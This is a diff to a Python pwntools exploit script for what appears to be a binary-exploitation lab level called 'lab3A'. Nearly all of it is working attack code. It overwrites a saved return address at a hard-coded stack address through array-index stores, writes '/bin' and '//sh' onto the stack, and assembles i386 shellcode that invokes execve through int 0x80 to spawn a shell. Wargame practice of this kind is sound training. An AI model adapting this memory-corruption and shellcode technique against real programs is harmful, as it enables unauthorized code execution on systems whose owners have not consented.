@@ -15,16 +15,21 @@ context(arch ='i386', os ='linux')
 # ======= Stack with payload =======
 # 0x0 [index 109] [Overwritten RA]
 # 0x4 [index 110] /bin
-# 0x8 [index 111] //sh
-# 0xC [index 112]
+# 0x8 [index 111] reserved for quend!
+# 0xC [index 112] //sh
 # 0x10 [index 113] 0xB
 
 # Script usage: python lab3a.py | ./lab3A
 
-asm_sh = [
+def string_to_int(string):
+    return str(int((string)[::-1].encode('hex'), 16))
+
+sh = [
     "pop esi",  # 110 0x68732f2f
     "pop ecx",  # 111 reserved for quend!
     "pop ecx",  # 112 0x6e69622f"
+    "pop eax",  # 113 syscall number
+
     "push esi",
     "push ecx",
 
@@ -32,25 +37,31 @@ asm_sh = [
 
     "mov ecx, edi",
     "mov edx, edi",
-    "mov al, 0xB",
-    "int  0x80"
+    "int  0x80",
 ]
 
-
 shellcode = ''
-payload = ''
 
-for instr in asm_sh:
+for instr in sh:
     shellcode += asm(instr)
 
+# ----
 print 'store'
-print str(int(0xBFFFF57C)) #[Overwritten RA]
+print str(int(0xBFFFF58C)) #[Overwritten RA]
 print '109'
+# ----
 print 'store'
-print str(int(('/bin')[::-1].encode('hex'), 16))
+print string_to_int('/sh')
 print '110'
+# ----
 print 'store'
-print str(int(('//sh')[::-1].encode('hex'), 16))
+print string_to_int('/bin')
 # Indeks 111 jest zarezerwowany i nie można z niego skorzystać
 print '112'
+# ----
+print 'store'
+print '11'
+print '113'
+# ----
 print 'quit' + shellcode
+
